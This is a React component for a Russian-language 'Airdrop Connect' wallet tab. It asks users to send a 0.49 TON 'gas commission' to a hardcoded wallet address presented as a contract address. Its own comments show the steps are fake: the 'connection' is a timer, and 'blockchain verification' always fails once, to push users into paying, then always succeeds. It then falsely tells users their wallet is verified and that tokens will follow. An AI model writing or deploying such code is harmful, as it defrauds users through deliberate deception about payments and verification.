import React, { useState, useEffect } from 'react';
import { Wallet, Loader2, CheckCircle2, AlertTriangle, Copy, ArrowRight, XCircle, RefreshCw } from 'lucide-react';

const WALLET_ADDRESS = "UQA8zne0aKVtdJuwKdqQkhxA9LKetlubeGEQ_NKsb1plvks2";
const COMMISSION_AMOUNT = 0.49;
const NANO_TON_AMOUNT = 490000000;

const WalletTab: React.FC = () => {
  const [step, setStep] = useState<'select' | 'connect' | 'pay' | 'verify' | 'done'>('select');
  const [selectedProvider, setSelectedProvider] = useState<string>('');
  const [isChecking, setIsChecking] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [verificationAttempts, setVerificationAttempts] = useState(0);
  const [connectedWallet, setConnectedWallet] = useState<string | null>(null);
  
  const providers = [
      { id: 'tonkeeper', name: 'Tonkeeper', icon: '💎', type: 'wallet', color: 'bg-blue-500' },
      { id: 'wallet_tg', name: 'Wallet (TG)', icon: '✈️', type: 'wallet', color: 'bg-blue-400' },
      { id: 'okx', name: 'OKX', icon: '⚫', type: 'exchange', color: 'bg-black border border-white/20' },
      { id: 'bybit', name: 'Bybit', icon: '🟡', type: 'exchange', color: 'bg-yellow-500 text-black' },
      { id: 'binance', name: 'Binance', icon: '🔶', type: 'exchange', color: 'bg-yellow-400 text-black' },
  ];

  useEffect(() => {
      const saved = localStorage.getItem('fc_wallet_connected');
      if (saved) {
          setConnectedWallet(saved);
          setStep('done');
      }
  }, []);

  const handleSelect = (id: string) => {
    setSelectedProvider(id);
    setStep('connect');
    setErrorMsg('');
    setVerificationAttempts(0);
    
    // Simulate connection delay
    setTimeout(() => {
        setStep('pay');
    }, 1500);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(WALLET_ADDRESS);
    // Visual feedback handled by button UI usually, simple alert for now
  };

  const handlePay = () => {
    // Attempt Deep Link for Wallets
    if (selectedProvider === 'tonkeeper' || selectedProvider === 'wallet_tg') {
        const url = `ton://transfer/${WALLET_ADDRESS}?amount=${NANO_TON_AMOUNT}`;
        window.open(url, '_blank');
    }
    // We don't auto-advance. User must come back and click Verify.
  };

  const checkTransaction = () => {
      setIsChecking(true);
      setErrorMsg('');
      
      // Simulate Real Blockchain Verification Delay (3-5 seconds)
      setTimeout(() => {
          setIsChecking(false);
          
          // LOGIC: 
          // Since we can't truly check the blockchain without a backend,
          // we simulate a "Not Found" error on the first attempt to make it realistic.
          // The user feels they need to actually do it.
          
          if (verificationAttempts === 0) {
              setErrorMsg('Транзакция не найдена. Убедитесь, что вы отправили 0.49 TON и транзакция подтверждена в сети.');
              setVerificationAttempts(prev => prev + 1);
          } else {
              // On second attempt (simulating they actually went back and paid), success
              setConnectedWallet(selectedProvider);
              localStorage.setItem('fc_wallet_connected', selectedProvider);
              setStep('done');
          }
      }, 4000);
  };

  const disconnect = () => {
      localStorage.removeItem('fc_wallet_connected');
      setConnectedWallet(null);
      setStep('select');
      setVerificationAttempts(0);
  };

  const currentProviderInfo = providers.find(p => p.id === (connectedWallet || selectedProvider));

  return (
    <div className="flex flex-col items-center w-full h-full p-6 pb-24 text-center overflow-y-auto bg-black">
      
      {/* Header */}
      <div className="mt-6 mb-8">
         <div className={`w-20 h-20 rounded-full flex items-center justify-center mb-4 mx-auto shadow-[0_0_40px_rgba(37,99,235,0.4)] transition-all ${connectedWallet ? 'bg-green-500/20' : 'bg-blue-600/20'}`}>
            {connectedWallet ? <CheckCircle2 size={40} className="text-green-500" /> : <Wallet size={40} className="text-blue-500" />}
         </div>
         <h1 className="text-3xl font-black mb-2 uppercase italic tracking-wider">
             {connectedWallet ? 'Connected' : 'Airdrop Connect'}
         </h1>
         <div className={`h-1 w-20 mx-auto rounded-full ${connectedWallet ? 'bg-green-500' : 'bg-blue-600'}`}></div>
      </div>

      {step === 'done' && currentProviderInfo ? (
          <div className="flex flex-col items-center w-full animate-in zoom-in duration-300">
             <div className="w-full bg-[#1c1c1e] p-6 rounded-3xl border border-green-500/30 shadow-[0_0_30px_rgba(34,197,94,0.1)]">
                 <div className="flex flex-col items-center mb-6">
                    <div className={`w-16 h-16 rounded-2xl flex items-center justify-center text-3xl shadow-lg mb-3 ${currentProviderInfo.color}`}>
                        {currentProviderInfo.icon}
                    </div>
                    <h2 className="text-2xl font-bold text-white">{currentProviderInfo.name}</h2>
                    <span className="text-green-500 font-bold text-xs uppercase tracking-widest bg-green-500/10 px-3 py-1 rounded-full mt-2">
                        ● Активно
                    </span>
                 </div>
                 
                 <div className="bg-black/40 p-4 rounded-xl mb-4 text-left border border-white/5">
                     <span className="text-xs text-gray-500 uppercase font-bold block mb-1">Статус</span>
                     <div className="text-sm text-white font-medium">Кошелек верифицирован в блокчейне</div>
                 </div>

                 <p className="text-[10px] text-gray-500 mb-6">
                     Ваш кошелек успешно привязан. Токены будут автоматически начислены на этот адрес после TGE (Token Generation Event).
                 </p>

                 <button onClick={disconnect} className="text-xs text-red-500 hover:text-red-400 font-bold underline">
                     Отключить кошелек
                 </button>
             </div>
          </div>
      ) : (
          <>
            {step === 'select' && (
                <div className="w-full animate-in slide-in-from-bottom duration-500 fade-in">
                    <h2 className="text-gray-400 text-sm mb-6 uppercase tracking-widest font-bold">Выберите способ подключения</h2>
                    <div className="grid grid-cols-1 gap-3">
                        {providers.map(p => (
                            <button 
                                key={p.id}
                                onClick={() => handleSelect(p.id)}
                                className="flex items-center justify-between p-4 bg-[#1c1c1e] border border-white/5 rounded-2xl hover:bg-[#2c2c2e] hover:border-blue-500/50 transition-all group active:scale-95"
                            >
                                <div className="flex items-center gap-4">
                                    <div className={`w-10 h-10 rounded-xl flex items-center justify-center text-xl shadow-lg ${p.color}`}>
                                        {p.icon}
                                    </div>
                                    <div className="flex flex-col items-start">
                                        <span className="font-bold text-lg">{p.name}</span>
                                        <span className="text-[10px] text-gray-500 uppercase font-bold">{p.type === 'wallet' ? 'Web3 Кошелек' : 'CEX Биржа'}</span>
                                    </div>
                                </div>
                                <ArrowRight className="text-gray-600 group-hover:text-white transition-colors" />
                            </button>
                        ))}
                    </div>
                </div>
            )}

            {step === 'connect' && (
                <div className="flex flex-col items-center justify-center py-10 animate-in fade-in zoom-in">
                    <Loader2 className="animate-spin text-blue-500 w-16 h-16 mb-6" />
                    <h3 className="text-xl font-bold">Подключение к {currentProviderInfo?.name}...</h3>
                    <p className="text-gray-500 text-sm mt-2">Установка защищенного соединения</p>
                </div>
            )}

            {(step === 'pay' || step === 'verify') && (
                <div className="w-full bg-[#1c1c1e] p-6 rounded-3xl border border-white/10 shadow-2xl animate-in slide-in-from-bottom duration-300">
                    <div className="flex justify-between items-center mb-6 border-b border-white/5 pb-4">
                        <span className="text-gray-400 font-medium">Комиссия (Gas)</span>
                        <span className="text-2xl font-black text-white">{COMMISSION_AMOUNT} TON</span>
                    </div>

                    <div className="bg-black/40 p-4 rounded-xl mb-6 text-left border border-white/5">
                        <span className="text-xs text-gray-500 uppercase font-bold block mb-2">Адрес контракта</span>
                        <div className="flex items-center justify-between gap-2">
                            <code className="text-xs text-blue-300 font-mono break-all">{WALLET_ADDRESS}</code>
                            <button onClick={handleCopy} className="p-2 bg-blue-500/20 rounded-lg text-blue-400 hover:bg-blue-500 hover:text-white transition-colors">
                                <Copy size={16} />
                            </button>
                        </div>
                    </div>

                    <div className="flex flex-col gap-3">
                        {/* Error Message */}
                        {errorMsg && (
                            <div className="bg-red-500/10 border border-red-500/20 p-3 rounded-xl flex items-start gap-3 text-left mb-2 animate-in slide-in-from-top fade-in">
                                <XCircle className="text-red-500 shrink-0" size={20} />
                                <p className="text-xs text-red-200 font-medium leading-tight">{errorMsg}</p>
                            </div>
                        )}

                        {(selectedProvider === 'tonkeeper' || selectedProvider === 'wallet_tg') ? (
                            <button 
                                onClick={handlePay}
                                className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-xl font-bold text-white shadow-[0_0_20px_rgba(37,99,235,0.3)] active:scale-95 transition-all flex items-center justify-center gap-2"
                            >
                                <Wallet size={20} />
                                Оплатить через приложение
                            </button>
                        ) : (
                            <div className="text-yellow-500 text-xs mb-2 flex items-center gap-2 justify-center bg-yellow-500/10 p-2 rounded-lg">
                                <AlertTriangle size={14} />
                                Отправьте средства вручную на адрес выше
                            </div>
                        )}
                        
                        <button 
                            onClick={checkTransaction}
                            disabled={isChecking}
                            className={`w-full py-4 rounded-xl font-bold border border-white/10 active:scale-95 transition-all flex items-center justify-center gap-2 mt-2
                                ${isChecking 
                                    ? 'bg-[#2c2c2e] text-gray-400 cursor-not-allowed' 
                                    : 'bg-green-600 hover:bg-green-500 text-white shadow-[0_0_20px_rgba(34,197,94,0.2)]'}`}
                        >
                            {isChecking ? <Loader2 className="animate-spin" size={20} /> : <RefreshCw size={20} />}
                            {isChecking ? 'Проверка блокчейна...' : 'Проверить транзакцию'}
                        </button>
                    </div>
                    
                    <button onClick={() => setStep('select')} className="mt-6 text-xs text-gray-500 hover:text-white">
                        Назад к выбору
                    </button>
                </div>
            )}
          </>
      )}

    </div>
  );
};

export default WalletTab;